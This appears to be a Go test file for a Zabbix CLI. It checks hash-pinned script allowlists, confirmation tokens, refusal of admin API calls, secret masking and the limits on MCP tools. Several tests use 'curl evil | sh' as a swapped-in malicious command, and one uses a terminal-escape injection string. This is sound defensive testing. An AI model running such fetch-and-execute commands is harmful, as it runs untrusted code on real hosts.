package cli

import (
	"errors"
	"io"
	"strings"
	"testing"
)

func TestScriptAllowlistIsPinnedToTheCommand(t *testing.T) {
	pin := scriptPin("ping", "ping {HOST.CONN}")
	cases := []struct {
		name    string
		entries []string
		command string
		ok      bool
		hint    string
	}{
		{"pinned and unchanged", []string{pin}, "ping {HOST.CONN}", true, ""},
		{"pinned by id", []string{scriptPin("5", "ping {HOST.CONN}")}, "ping {HOST.CONN}", true, ""},
		{"a name alone is refused", []string{"ping"}, "ping {HOST.CONN}", false, "not pinned"},
		{"the command was swapped after review", []string{pin}, "curl evil | sh", false, "not the one that was allowed"},
		{"not listed", []string{scriptPin("other", "x")}, "ping {HOST.CONN}", false, "not in allowed_scripts"},
	}
	for _, tc := range cases {
		ok, why := scriptAllowed(tc.entries, "ping", "5", tc.command)
		if ok != tc.ok || (tc.hint != "" && !strings.Contains(why, tc.hint)) {
			t.Errorf("%s: ok=%v why=%q", tc.name, ok, why)
		}
		if !ok && !strings.Contains(why, "@sha256:") {
			t.Errorf("%s: the refusal must show the entry to add: %q", tc.name, why)
		}
	}
}

func TestPrintableMakesEscapesVisible(t *testing.T) {
	got := printable("curl evil|sh\r\x1b[2K   ping {HOST.CONN}\n\tok")
	if strings.ContainsAny(got, "\r\x1b") {
		t.Fatalf("control characters must not reach the terminal: %q", got)
	}
	if !strings.Contains(got, `\x0d`) || !strings.Contains(got, `\x1b`) || !strings.Contains(got, "\n\tok") {
		t.Fatalf("escapes must be shown, newline and tab kept: %q", got)
	}
}

const pingScript = `[{"scriptid":"5","name":"ping","command":"ping {HOST.CONN}","type":"0","execute_on":"2","scope":"2"}]`

func scriptHandler(command string) func(rpcCall) fakeReply {
	return func(call rpcCall) fakeReply {
		switch call.Method {
		case "script.get":
			return fakeReply{Result: `[{"scriptid":"5","name":"ping","command":` + jsonString(command) + `,"type":"0","execute_on":"2","scope":"2"}]`}
		case "host.get":
			return fakeReply{Result: `[{"hostid":"10","host":"web1","name":"Web 1","status":"0"}]`}
		case "script.execute":
			return fakeReply{Result: `{"response":"success","value":"ok"}`}
		}
		return fakeReply{}
	}
}

// withConfirmation replaces the confirmation token and where it is read from.
func withConfirmation(t *testing.T, token, typed string) {
	t.Helper()
	oldTok, oldIn := confirmationToken, openConfirmationInput
	t.Cleanup(func() { confirmationToken, openConfirmationInput = oldTok, oldIn })
	confirmationToken = func() (string, error) { return token, nil }
	openConfirmationInput = func() (io.ReadCloser, error) { return io.NopCloser(strings.NewReader(typed + "\n")), nil }
}

func TestRunScriptNeedsOperatorTier(t *testing.T) {
	withConfirmation(t, "tok123", "tok123")
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
		Context: "permissions: readonly\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"}
	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
	if err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a readonly context must not run scripts: err=%v calls=%v", err, f.Calls)
	}
}

func TestRunScriptRunsOnlyThePinnedCommandAfterTheTokenIsTyped(t *testing.T) {
	ctxYAML := "permissions: operator\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"

	withConfirmation(t, "tok123", "tok123")
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err != nil || len(f.called("script.execute")) != 1 {
		t.Fatalf("the pinned script with the right token must run: err=%v", err)
	}

	withConfirmation(t, "tok123", "wrong")
	f = &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a wrong token must not run it: err=%v", err)
	}

	withConfirmation(t, "tok123", "tok123")
	f = &fakeZabbix{Handler: scriptHandler("curl evil | sh"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a script whose command changed must be refused: err=%v", err)
	}
}

func TestRunScriptRefusesWithoutATerminal(t *testing.T) {
	// the real opener: under `go test` stderr is not a terminal
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
		Context: "permissions: operator\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"}
	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
	if err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("with no terminal there is nobody to confirm: err=%v", err)
	}
}

func TestAPICallRefusesAdminWritesAndMixedCase(t *testing.T) {
	for _, tc := range []struct {
		method  string
		allowed bool
	}{
		{"user.update", false}, {"token.Generate", false}, {"Script.execute", false}, {"script.create", false},
		{"action.create", false}, {"role.update", false}, {"usergroup.update", false}, {"mediatype.create", false},
		{"host.update", true}, {"hostgroup.create", true},
	} {
		f := &fakeZabbix{}
		_, err := runFake(t, f, "api", "call", tc.method, "--params", `{"x":1}`, "--apply", "--no-state")
		sent := len(f.called(tc.method)) > 0 || len(f.called(strings.ToLower(tc.method))) > 0
		if tc.allowed && (err != nil || !sent) {
			t.Errorf("%s should go through: err=%v", tc.method, err)
		}
		if !tc.allowed && (err == nil || sent) {
			t.Errorf("%s must be refused: err=%v sent=%v", tc.method, err, sent)
		}
	}
	f := &fakeZabbix{Context: "api_call_admin: true"}
	if _, err := runFake(t, f, "api", "call", "user.update", "--params", `{"userid":"2"}`, "--apply", "--no-state"); err != nil || len(f.called("user.update")) != 1 {
		t.Fatalf("api_call_admin must allow it: %v", err)
	}
}

func TestAPICallMasksSecretsInReads(t *testing.T) {
	f := &fakeZabbix{Handler: func(call rpcCall) fakeReply {
		return fakeReply{Result: `[{"hostid":"1","tls_psk":"abcd","snmp_community":"public123","password":"p","name":"web"}]`}
	}}
	out, err := runFake(t, f, "api", "call", "host.get")
	if err != nil || strings.Contains(out, "abcd") || strings.Contains(out, "public123") || !strings.Contains(out, `"name": "web"`) {
		t.Fatalf("secrets must be masked, other fields kept: %v\n%s", err, out)
	}
	out, _ = runFake(t, f, "api", "call", "host.get", "--show-secrets")
	if !strings.Contains(out, "abcd") {
		t.Fatalf("--show-secrets must show them: %s", out)
	}
}

func TestInterfacesHideTheSNMPCommunity(t *testing.T) {
	f := &fakeZabbix{Handler: func(call rpcCall) fakeReply {
		if call.Method == "host.get" {
			return fakeReply{Result: `[{"hostid":"10","host":"sw1","name":"sw1","interfaces":[{"interfaceid":"1","type":"2","main":"1","useip":"1","ip":"10.0.0.1","dns":"","port":"161","available":"1","details":{"version":"2","community":"s3cret"}}]}]`}
		}
		return fakeReply{}
	}}
	out, err := runFake(t, f, "get", "interfaces", "sw1")
	if err != nil || strings.Contains(out, "s3cret") {
		t.Fatalf("the community must not be printed: %v\n%s", err, out)
	}
	_ = errors.New
}

func TestMCPNeverOffersAPICallOrShowSecrets(t *testing.T) {
	for _, tool := range buildMCPTools(true) {
		if tool.Name == "zbxctl_api_call" {
			t.Fatal("api call is full API access and must not be an MCP tool")
		}
		if _, ok := tool.flags["show-secrets"]; ok {
			t.Fatalf("%s offers show-secrets", tool.Name)
		}
	}
}
